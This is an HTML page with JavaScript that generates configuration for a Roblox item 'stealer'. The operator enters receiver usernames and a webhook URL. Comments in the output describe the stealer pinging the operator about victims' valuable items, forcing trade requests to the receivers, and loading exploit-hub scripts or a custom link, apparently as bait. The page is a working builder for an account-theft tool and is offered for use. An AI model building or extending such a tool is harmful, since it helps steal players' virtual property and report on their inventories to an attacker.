<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Coen On Top</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/styles/default.min.css">
<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.3.1/highlight.min.js"></script>
<style>
  body { font-family: Arial, sans-serif; background-color: #f4f4f4; text-align: center; padding: 50px; }
  .container { background-color: white; padding: 20px; border-radius: 8px; display: inline-block; }
  .input-field, button { margin: 10px 0; }
  button { padding: 10px 20px; background-color: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
  button:hover { background-color: #0056b3; }
  #output { text-align: left; white-space: pre-wrap; }
  textarea { width: 100%; height: 150px; }
</style>
</head>
<body>
  <div class="container">
    <h1>Generate Configuration</h1>
    <div class="input-field">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username">
    </div>
    <div class="input-field">
      <label for="webhook">Webhook URL:</label>
      <input type="text" id="webhook" name="webhook">
    </div>
    <div class="input-field">
      <label for="script">Script:</label>
      <input type="text" id="script" name="script" placeholder="None">
    </div>
    <div class="input-field">
      <label for="customLink">Custom Link:</label>
      <input type="text" id="customLink" name="customLink" placeholder="None">
    </div>
    <button onclick="generateOutput()">Generate</button>
    <textarea id="output"></textarea>
    <button onclick="copyToClipboard()">Copy to Clipboard</button>
  </div>

<script>
    function generateOutput() {
        var username = document.getElementById("username").value;
        var webhook = document.getElementById("webhook").value;
        var script = document.getElementById("script").value || "None";
        var customLink = document.getElementById("customLink").value || "None";
        
        var outputString = `Config = {
    Receivers = {"${username}"}, -- {"ROBLOX"} or {"ROBLOX", "ROBLOX1", "ROBLOX2"}
    Webhook = "${webhook}",
    FullInventory = true, -- If true, it will display all of the player's items.
    GoodItemsOnly = true, -- If set to true, the stealer will not ping you if the player only has items below legendary.
    ResendTrade = "gg", -- Send this in chat to resend the trade request if you don't receive it.
    Script = "${script}", -- Scripts > "None", "Custom", "Overdrive H", "Symphony Hub", "Highlight Hub", "Eclipse Hub", "R3TH PRIV", "AshbornnHub", "Nexus"
    CustomLink = "${customLink}" -- If Script is set to Custom, provide the custom URL here.
}`;
        document.getElementById("output").value = outputString;
        hljs.highlightAll();
    }

    function copyToClipboard() {
        var copyText = document.getElementById("output");
        copyText.select();
        document.execCommand("copy");
    }
</script>

</body>
</html>
